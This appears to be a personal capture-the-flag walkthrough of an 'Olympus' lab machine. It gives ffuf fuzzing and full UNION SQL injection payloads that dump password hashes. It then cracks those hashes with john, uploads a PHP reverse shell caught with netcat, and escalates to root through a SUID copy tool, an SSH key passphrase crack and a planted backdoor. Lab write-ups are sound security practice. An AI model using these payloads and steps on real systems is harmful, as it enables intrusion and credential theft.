@@ -1,0 +1,130 @@
+ffuf -w pentest-wordlists/common.txt -u http://10.114.166.173/FUZZ -H "Host: olympus.thm"
+FOUND: /~webmaster
+i tried some default credentials but nothing worked 
+so i focused on search functionality
+when i searched ' i show me "Query FailYou"
+which refers to SQLi + i searched for Victor CMS vulnerability and i found SQLi 
+so i saved req.txt using Burp Suite then i started an SQLMAP
+it found out already that search is vulnerable
+
+UNION vulnerability:
+test' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+test' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+test' UNION SELECT NULL,NULL,table_name,NULL,NULL,NULL,NULL,NULL,NULL,NULL from information_schema.tables#
+FOUND: users (table), flag (table)
+test' UNION SELECT NULL,NULL,column_name,NULL,NULL,NULL,NULL,NULL,NULL,NULL from information_schema.columns where table_name='flag'#
+test' UNION SELECT NULL,NULL,flag,NULL,NULL,NULL,NULL,NULL,NULL,NULL from flag#
+AND LIKE THAT THE FIRST FLAG IS FOUND
+
+test' UNION SELECT NULL,NULL,column_name,NULL,NULL,NULL,NULL,NULL,NULL,NULL from information_schema.columns where table_name='users'#
+FOUND: user_name, user_password
+test' UNION SELECT NULL,NULL,user_name,user_password,NULL,NULL,NULL,NULL,NULL,NULL from users#
+INTRESTING: user:     	     root
+	    hashed password: $2y$10$lcs4XWc5yjVNsMb4CUBGJevEkIuWdZN3rsuKWHCc.FGtapBAfW.mK
+	    user:     	     prometheus
+ 	    hashed password: $2y$10$YC6uoMwK9VpB5QL513vfLu1RV2sgBf01c0lzPHcz1qK2EArDvnj3C
+            user:     	     zeus
+            hashed password: $2y$10$cpJKDXh2wlAI5KlCsUaLCOnf0g5fiG0QSUS53zp/r0HMtaj6rT4lC
+
+after running john the ripper:
+john --wordlist=~/pentest-wordlists/rockyou.txt prometheus.hash 
+i successfully found the password which is summertime
+
+FOUND: user:     prometheus
+       password: summertime
+after logging in, I went through the website tour. and i found users list, and i noticed in the email that only prometheus email have 
+olympus.thm but the others have chat.olympus.thm so i added chat.olympus.thm to /etc/hosts
+that i got a login page and i logged with prometheus credentials
+i found a conversation between prometheus and zeus and i remarked that prometheus sent a file and all of that should be saved somewhere
+so i go back to tables and found chats (table)
+test' UNION SELECT NULL,NULL,column_name,NULL,NULL,NULL,NULL,NULL,NULL,NULL from information_schema.columns where table_name='chats'#
+there is: dt - file - msg - uname
+' UNION SELECT NULL,NULL,uname,dt,NULL,NULL,NULL,NULL,NULL,NULL from chats#
+nothing important in here
+' UNION SELECT NULL,null,file,msg,NULL,NULL,NULL,NULL,NULL,NULL from chats#
+i found that 47c3210d51761686f3af40a875eeaaea.txt is prometheus_password.txt
+
+after wasting sometime searching in the table looking at tables i went back to prometheus dashboard then i found out that i can load a
+file from the profile.php
+so i used pentestmoney/php-reverse-shell 
+after navigating to /img/php-reverse-shell.php it was prohibited 403
+so i tried uploading the file using chat 
+then i need to find out where this file is stored so i run gobuster
+/static/ and /uploads/ exist
+so i tried http://chat.olympus.thm/uploads/47c3210d51761686f3af40a875eeaaea.txt
+but found nothing actually it was a troll -> you really thought it would be this easy ?!
+90c14460391eca359e6215dddf8ea4bc.php is generated name of php-reverse-shell.php
+so i run nc -lvnp 1234
+well i found out that didnt change the ip and port.
+after i change the ip to my ip address i retried and it finally worked
+i checked sudo -l, id, whoami... then listed /home/ i found ubuntu and zeus
+i listed /home/zeus/ i found user.flag and thats the second flag
+
+next i checked the hint and he was talking about sticky bit so i checked all files with sticky bit set
+find / -perm -4000 2> /dev/null
+OUTPUT:
+/usr/lib/snapd/snap-confine
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/openssh/ssh-keysign
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/bin/cputils
+/usr/bin/sudo
+/usr/bin/mount
+/usr/bin/gpasswd
+/usr/bin/at
+/usr/bin/pkexec
+/usr/bin/su
+/usr/bin/chfn
+/usr/bin/chsh
+/usr/bin/passwd
+/usr/bin/fusermount
+/usr/bin/umount
+/usr/bin/newgrp
+/snap/snapd/23771/usr/lib/snapd/snap-confine
+/snap/snapd/24505/usr/lib/snapd/snap-confine
+/snap/core20/2571/usr/bin/chfn
+/snap/core20/2571/usr/bin/chsh
+/snap/core20/2571/usr/bin/gpasswd
+/snap/core20/2571/usr/bin/mount
+/snap/core20/2571/usr/bin/newgrp
+/snap/core20/2571/usr/bin/passwd
+/snap/core20/2571/usr/bin/su
+/snap/core20/2571/usr/bin/sudo
+/snap/core20/2571/usr/bin/umount
+/snap/core20/2571/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/snap/core20/2571/usr/lib/openssh/ssh-keysign
+/snap/core20/1518/usr/bin/chfn
+/snap/core20/1518/usr/bin/chsh
+/snap/core20/1518/usr/bin/gpasswd
+/snap/core20/1518/usr/bin/mount
+/snap/core20/1518/usr/bin/newgrp
+/snap/core20/1518/usr/bin/passwd
+/snap/core20/1518/usr/bin/su
+/snap/core20/1518/usr/bin/sudo
+/snap/core20/1518/usr/bin/umount
+/snap/core20/1518/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/snap/core20/1518/usr/lib/openssh/ssh-keysign
+
+after ls -l i found out that /usr/bin/cputils was owned by zeus not root so investigated and it was the file we are looking for
+after some investigation i found out that its a copying tool 
+so i copied ssh key from /home/zeus/.ssh/rsa_id to /tmp/rsa_id, cat is next /tmp/rsa_id and i saved it in my computer then connected
+through ssh to zeus account
+but ssh need passphrase to open up so i hashed the ssh_key using ssh2john next i used john to brute force it
+python3 /usr/lib/john/ssh2john.py zeus_ssh_key > zeus_ssh_key.hash
+john --wordlist=~/pentest-wordlists/rockyou.txt zeus_ssh_key.hash
+the key is snowflake
+
+after logging in i checked all direc/files owned by group zeus and i saw this weird named file:
+/var/www/html/0aB44fdS3eDnLkpsz3deGv8TttR4sc/VIGQFQFMYOST.php
+so i opened it, found php page which didnt exist in the main browser
+i opened it in my host and run it, the password was hard-coded so i entered it and it told me that there is a backdoor that i can use
+after some time i re opened the code and read it to know it give me root and i found it
+$suid_bd = "/lib/defended/libc.so.99";
+and i gained root
+i went straight to /root
+and i found the flag in /root/root.flag
+
+and for the final flag: grep -rl "flag{" /etc
+/etc/ssl/private/.b0nus.fl4g
+i searched only etc because the hint told me too 
